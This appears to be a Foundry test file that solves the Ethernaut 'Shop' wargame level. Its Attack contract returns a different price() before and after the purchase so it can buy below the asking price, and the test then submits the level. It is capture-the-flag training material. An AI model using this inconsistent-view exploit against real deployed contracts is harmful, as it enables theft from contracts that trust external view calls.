// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/21-Shop/ShopFactory.sol";
import "../src/Ethernaut.sol";

contract ShopTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testShopHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ShopFactory factory = new ShopFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        // Shop level = Shop(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        Attack hack = new Attack(levelAddress);
        hack.attack();


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack is Buyer {
    Shop shop;

    constructor(address target) {
        shop = Shop(target);
    }

    function attack() public {
        shop.buy();
    }
    
    function price() external view returns (uint) {
        return shop.isSold() ? 0 : 100;
    }
}